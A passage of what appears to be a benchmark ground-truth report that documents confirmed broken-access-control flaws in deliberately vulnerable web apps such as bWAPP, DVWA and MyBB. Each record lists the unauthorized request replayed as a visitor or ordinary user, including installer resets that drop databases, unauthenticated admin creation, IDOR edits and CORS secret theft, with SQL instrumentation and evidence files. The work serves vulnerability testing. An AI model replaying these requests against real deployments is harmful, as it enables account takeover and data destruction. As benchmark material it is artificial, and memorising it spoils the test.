- **Verification Method**: Read-type check: inject a unique marker token into a protected database field, then replay the query request as the attacking role and check whether the token appears in the response content.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Instrumentation (marker injection)**:
   - table: `phpns_users`
   - row: `id=11 (user2)`
   - column: `full_name`
   - token: `DRHLGT_user_edit_8670669266`
   - Note: CSV endpoint text says id=6; user2's current database id is 11

**2. Replay attack request (role: user1 (editing another account))**:
   - Request: `GET user.php?do=edit&id=11`
   - HTTP status: **200**
   - token_exposed_in_edit_form: **True**

#### SQL Statements Executed (chronological order)

```sql
-- [1] execute
UPDATE phpns_users SET full_name='DRHLGT_user_edit_8670669266' WHERE id=11;
```

**Evidence summary**: user1 GET user.php?do=edit&id=11 returned 200; user2's account data token exposed in the edit form=True.

**Evidence files**: [GT-014.json](audit/phpns/evidence/GT-014.json), [GT-014_gt014_user1_edit_user11.html](audit/phpns/evidence/GT-014_gt014_user1_edit_user11.html), [Phpns audit log](audit/phpns/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-015"></a>
### GT-015 · Phpns · HPE

- **Endpoint / Operation**: `user.php?do=editp (submit update for id=6)`
- **Operation Type**: Update
- **Expected Authorization Requirement**: A user may modify only their own account unless the current user is an administrator.
- **Unauthorized Test Case**: Log in as user1 and submit the account-edit payload for user2's id.
- **Verification Method**: Update-type check: write token1 into the target field, then replay an update request carrying token2 as the attacking role and check whether token1 in the database becomes token2.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Instrumentation (marker injection)**:
   - table: `phpns_users`
   - row: `id=11 (user2)`
   - column: `full_name`
   - token1: `DRHLGT_usr_before_8670670466`
   - token2: `DRHLGT_usr_after_8670670466`

**2. Replay attack request (role: user1 (editing another account))**:
   - Request: `POST user.php?do=editp id=11 fullname=<token2>`
   - HTTP status: **200**
   - db_full_name_before: `DRHLGT_usr_before_8670670466`
   - db_full_name_after: `DRHLGT_usr_after_8670670466`
   - updated: **True**

#### SQL Statements Executed (chronological order)

```sql
-- [1] execute
UPDATE phpns_users SET full_name='DRHLGT_usr_before_8670670466' WHERE id=11;
-- [2] query
SHOW COLUMNS FROM phpns_users;
-- [3] query
SELECT * FROM phpns_users WHERE id=11 LIMIT 1;
-- [4] scalar
SELECT full_name FROM phpns_users WHERE id=11;
```

**Evidence summary**: user1 POST user.php?do=editp returned 200; user2 (id=11) full_name changed DRHLGT_usr_before_8670670466 -> DRHLGT_usr_after_8670670466 (updated=True).

**Evidence files**: [GT-015.json](audit/phpns/evidence/GT-015.json), [Phpns audit log](audit/phpns/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-016"></a>
### GT-016 · Bwapp · VPE

- **Endpoint / Operation**: `backdoor.php`
- **Operation Type**: Resource Access
- **Expected Authorization Requirement**: The backdoor or privileged diagnostic page must not be accessible to an unauthenticated visitor.
- **Unauthorized Test Case**: Request backdoor.php as visitor.
- **Verification Method**: Read-type check: inject a unique marker token into a protected database field, then replay the query request as the attacking role and check whether the token appears in the response content.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Replay attack request (role: visitor (no login))**:
   - Request: `GET backdoor.php`
   - HTTP status: **200**
   - backdoor_uploader_form_exposed: **True**

**2. Replay attack request (role: visitor (no login))**:
   - Request: `POST backdoor.php upload=1`
   - HTTP status: **302**
   - upload_action_redirected_to_login: **True**

**Evidence summary**: visitor GET backdoor.php returned 200 and exposes the NSA file uploader form (exposed=True); the upload action itself redirects a sessionless visitor to login.

**Evidence files**: [GT-016.json](audit/bwapp/evidence/GT-016.json), [GT-016_gt016_visitor_backdoor.html](audit/bwapp/evidence/GT-016_gt016_visitor_backdoor.html), [Bwapp audit log](audit/bwapp/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-017"></a>
### GT-017 · Bwapp · VPE

- **Endpoint / Operation**: `install.php`
- **Operation Type**: Resource Access / Administrative Action
- **Expected Authorization Requirement**: The installer must be disabled after deployment or restricted to an administrator.
- **Unauthorized Test Case**: Request install.php as visitor.
- **Verification Method**: Read-type check: inject a unique marker token into a protected database field, then replay the query request as the attacking role and check whether the token appears in the response content.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Replay attack request (role: visitor (no login))**:
   - Request: `GET install.php`
   - HTTP status: **200**
   - installer_link_exposed: **True**

**2. Instrumentation (marker injection)**:
   - precondition: `DROP DATABASE bwapp (fresh-install simulation)`

**3. Replay attack request (role: visitor (no login))**:
   - Request: `GET install.php?install=yes`
   - HTTP status: **200**
   - installer_action_completed: **True**
   - recreated_users_table_rows: `2`

#### SQL Statements Executed (chronological order)

```sql
-- [1] execute
DROP DATABASE bwapp;
-- [2] scalar
SELECT COUNT(*) FROM bwapp.users;
```

**Evidence summary**: visitor GET install.php returned 200 with the installer link (installer_link_exposed=True); the install action was invoked as visitor and completed (installed=True); database restored afterwards.

**Evidence files**: [GT-017.json](audit/bwapp/evidence/GT-017.json), [GT-017_gt017_visitor_install_page.html](audit/bwapp/evidence/GT-017_gt017_visitor_install_page.html), [GT-017_gt017_visitor_install_action.html](audit/bwapp/evidence/GT-017_gt017_visitor_install_action.html), [Bwapp audit log](audit/bwapp/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-018"></a>
### GT-018 · Bwapp · VPE

- **Endpoint / Operation**: `secret-cors-1.php`
- **Operation Type**: Resource Access
- **Expected Authorization Requirement**: Only an authorized principal or trusted origin may obtain the protected CORS secret.
- **Unauthorized Test Case**: Request secret-cors-1.php as visitor without authorization.
- **Verification Method**: Read-type check: inject a unique marker token into a protected database field, then replay the query request as the attacking role and check whether the token appears in the response content.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Replay attack request (role: visitor (no login))**:
   - Request: `GET secret-cors-1.php`
   - HTTP status: **200**
   - secret_exposed: **True**

**Evidence summary**: visitor GET secret-cors-1.php returned 200; protected secret obtained without authorization=True.

**Evidence files**: [GT-018.json](audit/bwapp/evidence/GT-018.json), [GT-018_GT-018_visitor.html](audit/bwapp/evidence/GT-018_GT-018_visitor.html), [Bwapp audit log](audit/bwapp/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-019"></a>
### GT-019 · Bwapp · VPE

- **Endpoint / Operation**: `secret-cors-2.php`
- **Operation Type**: Resource Access
- **Expected Authorization Requirement**: Only an authorized principal or trusted origin may obtain the protected CORS secret.
- **Unauthorized Test Case**: Request secret-cors-2.php as visitor without authorization.
- **Verification Method**: Read-type check: inject a unique marker token into a protected database field, then replay the query request as the attacking role and check whether the token appears in the response content.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Replay attack request (role: visitor (no login))**:
   - Request: `GET secret-cors-2.php`
   - HTTP status: **200**
   - secret_exposed: **False**

**2. Replay attack request (role: visitor (no login))**:
   - Request: `GET secret-cors-2.php with headers {'Origin': 'http://intranet.itsecgames.com'}`
   - HTTP status: **200**
   - secret_exposed_with_headers: **True**

**Evidence summary**: visitor GET secret-cors-2.php returned 200; protected secret obtained without authorization=True.

**Evidence files**: [GT-019.json](audit/bwapp/evidence/GT-019.json), [GT-019_GT-019_visitor.html](audit/bwapp/evidence/GT-019_GT-019_visitor.html), [GT-019_GT-019_visitor_headers.html](audit/bwapp/evidence/GT-019_GT-019_visitor_headers.html), [Bwapp audit log](audit/bwapp/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-020"></a>
### GT-020 · Bwapp · VPE

- **Endpoint / Operation**: `secret-cors-3.php`
- **Operation Type**: Resource Access
- **Expected Authorization Requirement**: Only an authorized principal or trusted origin may obtain the protected CORS secret.
- **Unauthorized Test Case**: Request secret-cors-3.php as visitor without authorization.
- **Verification Method**: Read-type check: inject a unique marker token into a protected database field, then replay the query request as the attacking role and check whether the token appears in the response content.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Replay attack request (role: visitor (no login))**:
   - Request: `GET secret-cors-3.php`
   - HTTP status: **200**
   - secret_exposed: **True**

**Evidence summary**: visitor GET secret-cors-3.php returned 200; protected secret obtained without authorization=True.

**Evidence files**: [GT-020.json](audit/bwapp/evidence/GT-020.json), [GT-020_GT-020_visitor.html](audit/bwapp/evidence/GT-020_GT-020_visitor.html), [Bwapp audit log](audit/bwapp/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-021"></a>
### GT-021 · DVWA · VPE

- **Endpoint / Operation**: `about.php`
- **Operation Type**: Resource Access
- **Expected Authorization Requirement**: The page must require the authenticated security-lab role assumed by the application workflow.
- **Unauthorized Test Case**: Request about.php as visitor without a DVWA session.
- **Verification Method**: Read-type check: inject a unique marker token into a protected database field, then replay the query request as the attacking role and check whether the token appears in the response content.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Replay attack request (role: visitor (no DVWA session))**:
   - Request: `GET about.php`
   - HTTP status: **200**
   - about_content_exposed: **True**

**Evidence summary**: visitor GET about.php returned 200 and serves the DVWA About page content without any session (about_content_exposed=True).

**Evidence files**: [GT-021.json](audit/dvwa/evidence/GT-021.json), [GT-021_gt021_visitor_about.html](audit/dvwa/evidence/GT-021_gt021_visitor_about.html), [DVWA audit log](audit/dvwa/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-022"></a>
### GT-022 · DVWA · VPE

- **Endpoint / Operation**: `instructions.php?doc=p1`
- **Operation Type**: Resource Access
- **Expected Authorization Requirement**: The requested instruction document must require the authenticated security-lab role assumed by the application workflow.
- **Unauthorized Test Case**: Request instructions.php with a valid doc value as visitor without a DVWA session.
- **Verification Method**: Read-type check: inject a unique marker token into a protected database field, then replay the query request as the attacking role and check whether the token appears in the response content.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Replay attack request (role: visitor (no DVWA session))**:
   - Request: `GET instructions.php?doc=readme`
   - HTTP status: **200**
   - document_content_exposed: **True**

**Evidence summary**: visitor GET instructions.php?doc=readme returned 200 and serves the protected instruction document (document_content_exposed=True).

**Evidence files**: [GT-022.json](audit/dvwa/evidence/GT-022.json), [GT-022_gt022_visitor_instructions.html](audit/dvwa/evidence/GT-022_gt022_visitor_instructions.html), [DVWA audit log](audit/dvwa/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-023"></a>
### GT-023 · DVWA · VPE

- **Endpoint / Operation**: `setup.php`
- **Operation Type**: Administrative Action
- **Expected Authorization Requirement**: Only an administrator may initialize or reset the DVWA database.
- **Unauthorized Test Case**: Request and invoke setup.php as visitor without a DVWA session.
- **Verification Method**: Replay the request as the attacking role and compare the response content and the before/after database state.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Instrumentation (marker injection)**:
   - table: `guestbook`
   - marker_comment: `DRHLGT_guestbook_8677303291`
   - marker_before: `1`
   - users_before: `5`

**2. Replay attack request (role: visitor (no DVWA session))**:
   - Request: `GET setup.php`
   - HTTP status: **200**
   - create_reset_form_exposed: **True**
   - anti_csrf_user_token_extracted: **True**

**3. Replay attack request (role: visitor (no DVWA session))**:
   - Request: `POST setup.php create_db=Create / Reset Database (with anti-CSRF user_token)`
   - HTTP status: **302**
   - redirect_location: `/DVWA/setup.php`
   - reset_completed: **True**
   - marker_row_after: `0`
   - users_after: `5`
   - admin_credential_reset_hash: `5f4dcc3b5aa765d61d8327deb882cf99`

#### SQL Statements Executed (chronological order)

```sql
-- [1] execute
INSERT INTO guestbook (comment, name) VALUES ('DRHLGT_guestbook_8677303291', 'drhlgt');
-- [2] scalar
SELECT COUNT(*) FROM guestbook WHERE comment='DRHLGT_guestbook_8677303291';
-- [3] scalar
SELECT COUNT(*) FROM users;
-- [4] scalar
SELECT COUNT(*) FROM guestbook WHERE comment='DRHLGT_guestbook_8677303291';
-- [5] scalar
SELECT COUNT(*) FROM users;
-- [6] scalar
SELECT password FROM users WHERE user='admin' LIMIT 1;
```

**Evidence summary**: visitor GET setup.php returned 200 with the Create/Reset Database form (exposed=True); the visitor-triggered reset rebuilt the database: marker row 1->0, users 5->5; baseline restored afterwards.

**Evidence files**: [GT-023.json](audit/dvwa/evidence/GT-023.json), [GT-023_gt023_visitor_setup.html](audit/dvwa/evidence/GT-023_gt023_visitor_setup.html), [GT-023_gt023_visitor_setup_action.html](audit/dvwa/evidence/GT-023_gt023_visitor_setup_action.html), [DVWA audit log](audit/dvwa/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-024"></a>
### GT-024 · SCARF · VPE

- **Endpoint / Operation**: `install.php`
- **Operation Type**: Resource Access / Administrative Action
- **Expected Authorization Requirement**: The installer must be disabled after deployment or restricted to an administrator.
- **Unauthorized Test Case**: Request install.php as visitor.
- **Verification Method**: Read-type check: inject a unique marker token into a protected database field, then replay the query request as the attacking role and check whether the token appears in the response content.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Instrumentation (marker injection)**:
   - table: `options`
   - marker_row: `DRHLGT_MARKER`
   - marker_before: `1`

**2. Replay attack request (role: visitor (no login))**:
   - Request: `GET install.php`
   - HTTP status: **200**
   - installer_form_exposed: **True**

**3. Replay attack request (role: visitor (no login))**:
   - Request: `POST install.php (dbname=scarf ...)`
   - HTTP status: **200**
   - confirmdrop_prompt_shown: **True**

**4. Replay attack request (role: visitor (no login))**:
   - Request: `POST install.php + confirmdrop`
   - HTTP status: **200**
   - installer_completed: **True**
   - marker_row_after_reinstall: `0`
   - fresh_default_options_after_reinstall: `1`

#### SQL Statements Executed (chronological order)

```sql
-- [1] execute
INSERT INTO options (name, type, value) VALUES ('DRHLGT_MARKER', 'text', 'present');
-- [2] scalar
SELECT COUNT(*) FROM options WHERE name='DRHLGT_MARKER';
-- [3] scalar
SELECT COUNT(*) FROM options WHERE name='DRHLGT_MARKER';
-- [4] scalar
SELECT COUNT(*) FROM options WHERE name='Conference Name';
```

**Evidence summary**: visitor GET install.php returned 200 with the installer form (form_exposed=True); visitor-triggered install dropped and recreated the scarf database: marker 1->0, fresh default options=1; config.php and database were restored afterwards.

**Evidence files**: [GT-024.json](audit/scarf/evidence/GT-024.json), [GT-024_gt024_visitor_install.html](audit/scarf/evidence/GT-024_gt024_visitor_install.html), [GT-024_gt024_visitor_install_confirm.html](audit/scarf/evidence/GT-024_gt024_visitor_install_confirm.html), [GT-024_gt024_visitor_install_done.html](audit/scarf/evidence/GT-024_gt024_visitor_install_done.html), [SCARF audit log](audit/scarf/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-025"></a>
### GT-025 · SCARF · VPE

- **Endpoint / Operation**: `comments.php`
- **Operation Type**: Resource Access
- **Expected Authorization Requirement**: Only the administrator may open the comment-moderation page and view pending comments.
- **Unauthorized Test Case**: Request comments.php as visitor and as ordinary users.
- **Verification Method**: Read-type check: inject a unique marker token into a protected database field, then replay the query request as the attacking role and check whether the token appears in the response content.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Instrumentation (marker injection)**:
   - table: `comments`
   - inserted_row_id: `300`
   - comment: `DRHLGT_pending_comment_8670681795`
   - approved: `0`

**2. Replay attack request (role: visitor)**:
   - Request: `GET comments.php (moderation list of pending comments)`
   - HTTP status: **200**
   - pending_comment_token_exposed: **True**

**3. Replay attack request (role: user1)**:
   - Request: `GET comments.php (moderation list of pending comments)`
   - HTTP status: **200**
   - pending_comment_token_exposed: **True**

**4. Replay attack request (role: user2)**:
   - Request: `GET comments.php (moderation list of pending comments)`
   - HTTP status: **200**
   - pending_comment_token_exposed: **True**

#### SQL Statements Executed (chronological order)

```sql
-- [1] execute
INSERT INTO comments (user_id, paper_id, comment, date, approved) VALUES (1, 1, 'DRHLGT_pending_comment_8670681795', NOW(), 0);
-- [2] scalar
SELECT comment_id FROM comments WHERE comment='DRHLGT_pending_comment_8670681795' ORDER BY comment_id DESC LIMIT 1;
```

**Evidence summary**: pending comment token exposed to visitor=True, user1=True, user2=True on GET comments.php.

**Evidence files**: [GT-025.json](audit/scarf/evidence/GT-025.json), [GT-025_gt025_visitor_comments.html](audit/scarf/evidence/GT-025_gt025_visitor_comments.html), [GT-025_gt025_user1_comments.html](audit/scarf/evidence/GT-025_gt025_user1_comments.html), [GT-025_gt025_user2_comments.html](audit/scarf/evidence/GT-025_gt025_user2_comments.html), [SCARF audit log](audit/scarf/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-026"></a>
### GT-026 · SCARF · VPE

- **Endpoint / Operation**: `generaloptions.php`
- **Operation Type**: Update
- **Expected Authorization Requirement**: Only the administrator may change global conference options.
- **Unauthorized Test Case**: Submit the general-options form as visitor or an ordinary user.
- **Verification Method**: Update-type check: write token1 into the target field, then replay an update request carrying token2 as the attacking role and check whether token1 in the database becomes token2.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Instrumentation (marker injection)**:
   - table: `options`
   - row: `Conference Name`
   - token1: `DRHLGT_conf_before_8670682765`
   - token2: `DRHLGT_conf_after_8670682765`

**2. Replay attack request (role: visitor (no login))**:
   - Request: `POST generaloptions.php Conference_Name=DRHLGT_conf_after_8670682765`
   - HTTP status: **200**
   - db_value_before: `DRHLGT_conf_before_8670682765`
   - db_value_after: `DRHLGT_conf_after_8670682765`
   - updated: **True**

#### SQL Statements Executed (chronological order)

```sql
-- [1] execute
UPDATE options SET value='DRHLGT_conf_before_8670682765' WHERE name='Conference Name';
-- [2] scalar
SELECT value FROM options WHERE name='Conference Name';
```

**Evidence summary**: visitor POST generaloptions.php returned 200; global option 'Conference Name' changed DRHLGT_conf_before_8670682765 -> DRHLGT_conf_after_8670682765 (updated=True).

**Evidence files**: [GT-026.json](audit/scarf/evidence/GT-026.json), [SCARF audit log](audit/scarf/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-027"></a>
### GT-027 · EventsLister · VPE

- **Endpoint / Operation**: `admin/setup.php`
- **Operation Type**: Administrative Action
- **Expected Authorization Requirement**: Only an administrator may execute database or administrator-account setup.
- **Unauthorized Test Case**: Request and submit admin/setup.php as visitor.
- **Verification Method**: Replay the request as the attacking role and compare the response content and the before/after database state.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Instrumentation (marker injection)**:
   - table: `admin`
   - cleared_row: `[['1', 'admin@qq.com', 'ed057c7f79e1f896f641242d834ed2b1']]`
   - events_before: `21`
   - Note: admin id=1 cleared to simulate fresh-install precondition

**2. Replay attack request (role: visitor (no login))**:
   - Request: `POST admin/setup.php uname=<token>@example.test test_event=yes`
   - HTTP status: **200**
   - success_message_in_response: **True**
   - admin_id1_uname_after: `DRHLGT_setupadmin_8670684636@example.test`
   - admin_account_created_by_visitor: **True**
   - events_before: `21`
   - events_after: `22`
   - test_event_rows: `2`

#### SQL Statements Executed (chronological order)

```sql
-- [1] query
SELECT id, uname, pword FROM admin WHERE id=1;
-- [2] scalar
SELECT COUNT(*) FROM events;
-- [3] execute
DELETE FROM admin WHERE id=1;
-- [4] scalar
SELECT uname FROM admin WHERE id=1;
-- [5] scalar
SELECT COUNT(*) FROM events;
-- [6] scalar
SELECT COUNT(*) FROM events WHERE event='Test Event';
```

**Evidence summary**: visitor POST admin/setup.php returned 200; visitor recreated the administrator account id=1 with attacker-chosen email (created=True) and the setup inserted a Test Event row (events 21->22); baseline restored afterwards.

**Evidence files**: [GT-027.json](audit/events_lister/evidence/GT-027.json), [GT-027_gt027_visitor_setup.html](audit/events_lister/evidence/GT-027_gt027_visitor_setup.html), [EventsLister audit log](audit/events_lister/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-028"></a>
### GT-028 · EventsLister · VPE

- **Endpoint / Operation**: `admin/user_add.php`
- **Operation Type**: Create
- **Expected Authorization Requirement**: Only an authenticated administrator may create another administrator account.
- **Unauthorized Test Case**: Submit a new account through admin/user_add.php as visitor.
- **Verification Method**: Create-type check: replay a creation request carrying a unique token as the attacking role, then check whether a new row containing the token appears in the database.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Instrumentation (marker injection)**:
   - table: `admin`
   - token_email: `DRHLGT_addadmin_8670685443@example.test`

**2. Replay attack request (role: visitor (no login))**:
   - Request: `POST admin/user_add.php uname=<token>@example.test`
   - HTTP status: **200**
   - admin_row_created_id: `4`
   - created: **True**

#### SQL Statements Executed (chronological order)

```sql
-- [1] scalar
SELECT id FROM admin WHERE uname='DRHLGT_addadmin_8670685443@example.test' LIMIT 1;
```

**Evidence summary**: visitor POST admin/user_add.php returned 200; a new administrator account row (id=4, uname=DRHLGT_addadmin_8670685443@example.test) was created without any login (created=True).

**Evidence files**: [GT-028.json](audit/events_lister/evidence/GT-028.json), [GT-028_gt028_visitor_user_add.html](audit/events_lister/evidence/GT-028_gt028_visitor_user_add.html), [EventsLister audit log](audit/events_lister/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-029"></a>
### GT-029 · Mybb · VPE

- **Endpoint / Operation**: `usercp2.php?action=addsubscription&fid=p1&type=forum`
- **Operation Type**: Create
- **Expected Authorization Requirement**: A logged-in user must supply the protected forum password before subscribing to a password-protected forum.
- **Unauthorized Test Case**: Log in as an ordinary user who has not supplied the forum password and request the addsubscription action for that forum id.
- **Verification Method**: Create-type check: replay a creation request carrying a unique token as the attacking role, then check whether a new row containing the token appears in the database.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Instrumentation (marker injection)**:
   - forum: `[['2', 'My Forum', '12345678']]`
   - user1: `[['2', 'user1']]`
   - subscriptions_before: `0`

**2. Replay attack request (role: user1 (has not supplied the forum password))**:
   - Request: `GET forumdisplay.php?fid=2`
   - HTTP status: **200**
   - forum_password_gate_shown: **True**

**3. Replay attack request (role: user1 (has not supplied the forum password))**:
   - Request: `GET usercp2.php?action=addsubscription&fid=2&type=forum (my_post_key computed at runtime)`
   - HTTP status: **200**
   - subscriptions_before: `0`
   - subscriptions_after: `1`
   - subscription_row_created: `[['2', '2']]`
   - created: **True**

#### SQL Statements Executed (chronological order)

```sql
-- [1] query
SELECT fid, name, password FROM mybb_forums WHERE fid=2;
-- [2] query
SELECT uid, username FROM mybb_users WHERE username='user1';
-- [3] scalar
SELECT COUNT(*) FROM mybb_forumsubscriptions WHERE fid=2 AND uid=2;
-- [4] runtime_token_query
SELECT MD5(CONCAT(loginkey,salt,regdate)) FROM mybb_users WHERE username='user1' LIMIT 1  (my_post_key computed by DRHL runtime-token logic during the replay);
-- [5] scalar
SELECT COUNT(*) FROM mybb_forumsubscriptions WHERE fid=2 AND uid=2;
-- [6] query
SELECT fid, uid FROM mybb_forumsubscriptions WHERE fid=2 AND uid=2;
```

**Evidence summary**: forum 2 is password-protected (forumdisplay shows password gate=True); user1 GET addsubscription returned 200 and created the subscription row [['2', '2']] without ever supplying the forum password (created=True).

**Evidence files**: [GT-029.json](audit/mybb/evidence/GT-029.json), [GT-029_gt029_user1_forumdisplay.html](audit/mybb/evidence/GT-029_gt029_user1_forumdisplay.html), [Mybb audit log](audit/mybb/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-030"></a>
### GT-030 · Wackopicko · HPE

- **Endpoint / Operation**: `users/view.php?userid=11`
- **Operation Type**: Resource Access
- **Expected Authorization Requirement**: An ordinary user may view only their own protected profile unless explicitly authorized to view another account.
- **Unauthorized Test Case**: Log in as user1 and change userid to user2's identifier 11.
- **Verification Method**: Read-type check: inject a unique marker token into a protected database field, then replay the query request as the attacking role and check whether the token appears in the response content.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Instrumentation (marker injection)**:
   - table: `users`
   - row: `id=11`
   - column: `login`
   - token: `DRHLGT_profile_login_8770866814`
   - original_login: `bryce`
   - Note: in the current deployment user id 11 is the seeded user 'bryce' (owner of pictures 22/23); the endpoint parameter follows the released table

**2. Replay attack request (role: user1 (scanner1, not the profile owner))**:
   - Request: `GET users/view.php?userid=11`
   - HTTP status: **200**
   - token_exposed_in_response: **True**

#### SQL Statements Executed (chronological order)

```sql
-- [1] scalar
SELECT login FROM users WHERE id=11;
-- [2] execute
UPDATE users SET login='DRHLGT_profile_login_8770866814' WHERE id=11;
```

**Evidence summary**: user1 GET users/view.php?userid=11 returned 200; the profile page of user id=11 was served and the token placed in that user's login field was exposed (exposed=True).

**Evidence files**: [GT-030.json](audit/wackopicko/evidence/GT-030.json), [GT-030_gt030_user1_view_user11.html](audit/wackopicko/evidence/GT-030_gt030_user1_view_user11.html), [Wackopicko audit log](audit/wackopicko/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-031"></a>
### GT-031 · Wackopicko · VPE

- **Endpoint / Operation**: `users/sample.php?userid=p1 (login-gate bypass of the profile view)`
- **Operation Type**: Resource Access
- **Expected Authorization Requirement**: The user profile view (users/view.php) requires an authenticated login; the sample.php wrapper must not bypass this requirement - unauthenticated visitors must not be able to view a user's profile page.
- **Unauthorized Test Case**: Request users/sample.php?userid=11 as visitor without a session.
- **Verification Method**: Read-type check: inject a unique marker token into a protected database field, then replay the query request as the attacking role and check whether the token appears in the response content.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Instrumentation (marker injection)**:
   - table: `users`
   - row: `id=11`
   - column: `login`
   - token: `DRHLGT_sample_login_8770867712`
   - original_login: `bryce`

**2. Replay attack request (role: visitor (no login))**:
   - Request: `GET users/sample.php?userid=11 (login gate bypassed)`
   - HTTP status: **200**
   - token_exposed_in_response: **True**

**3. Replay attack request (role: visitor (no login))**:
   - Request: `GET users/view.php?userid=11 (regular entry, login required)`
   - HTTP status: **303**
   - regular_entry_redirects_to_login: **True**

**4. restore**:
   - kind: `restore`
   - login_field_reverted: `True`

#### SQL Statements Executed (chronological order)

```sql
-- [1] scalar
SELECT login FROM users WHERE id=11;
-- [2] execute
UPDATE users SET login='DRHLGT_sample_login_8770867712' WHERE id=11;
-- [3] execute
UPDATE users SET login='bryce' WHERE id=11;
-- [4] scalar
SELECT login FROM users WHERE id=11;
```

**Evidence summary**: visitor GET users/sample.php?userid=11 returned 200 and served the profile page of user id=11 with the token placed in the login field exposed (exposed=True); the regular entry users/view.php requires login and redirects the visitor (redirected=True); the instrumented login field was reverted afterwards.

**Evidence files**: [GT-031.json](audit/wackopicko/evidence/GT-031.json), [GT-031_gt031_visitor_sample.html](audit/wackopicko/evidence/GT-031_gt031_visitor_sample.html), [Wackopicko audit log](audit/wackopicko/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-032"></a>
### GT-032 · Jspblog · VPE

- **Endpoint / Operation**: `admin/addnews.jsp`
- **Operation Type**: Resource Access
- **Expected Authorization Requirement**: Only an authenticated administrator may open the add-news form.
- **Unauthorized Test Case**: Request admin/addnews.jsp as visitor.
- **Verification Method**: Read-type check: inject a unique marker token into a protected database field, then replay the query request as the attacking role and check whether the token appears in the response content.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Replay attack request (role: visitor (no login))**:
   - Request: `GET admin/addnews.jsp`
   - HTTP status: **200**
   - form_content_exposed: **True**

**Evidence summary**: visitor GET admin/addnews.jsp returned 200 and serves the protected admin form without any session (form_content_exposed=True).

**Evidence files**: [GT-032.json](audit/jspblog/evidence/GT-032.json), [GT-032_GT-032_visitor.html](audit/jspblog/evidence/GT-032_GT-032_visitor.html), [Jspblog audit log](audit/jspblog/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-033"></a>
### GT-033 · Jspblog · VPE

- **Endpoint / Operation**: `admin/addnews2.jsp`
- **Operation Type**: Create
- **Expected Authorization Requirement**: Only an authenticated administrator may create a news item.
- **Unauthorized Test Case**: Submit headline and body parameters to admin/addnews2.jsp as visitor.
- **Verification Method**: Create-type check: replay a creation request carrying a unique token as the attacking role, then check whether a new row containing the token appears in the database.
- **Verdict**: **Vulnerable (confirmed)**

#### Experiment Steps

**1. Instrumentation (marker injection)**:
   - table: `news`
   - token_headline: `DRHLGT_news_8684166432`

**2. Replay attack request (role: visitor (no login))**:
   - Request: `POST admin/addnews2.jsp headline=DRHLGT_news_8684166432`
   - HTTP status: **200**
   - news_row_created: **True**

#### SQL Statements Executed (chronological order)

```sql
-- [1] scalar
SELECT COUNT(*) FROM news WHERE headline='DRHLGT_news_8684166432';
```

**Evidence summary**: visitor POST admin/addnews2.jsp returned 200; a news row with the token headline was created in the portal database (created=True).

**Evidence files**: [GT-033.json](audit/jspblog/evidence/GT-033.json), [GT-033_gt033_visitor.html](audit/jspblog/evidence/GT-033_gt033_visitor.html), [Jspblog audit log](audit/jspblog/audit_log.md)
**Database restore**: ✅ The database baseline was restored after this record and verified by re-dumping and comparing against the baseline.

---

<a id="GT-034"></a>
### GT-034 · Jspblog · VPE

- **Endpoint / Operation**: `admin/adduser.jsp`
- **Operation Type**: Resource Access
- **Expected Authorization Requirement**: Only an authenticated administrator may open the user-creation form.
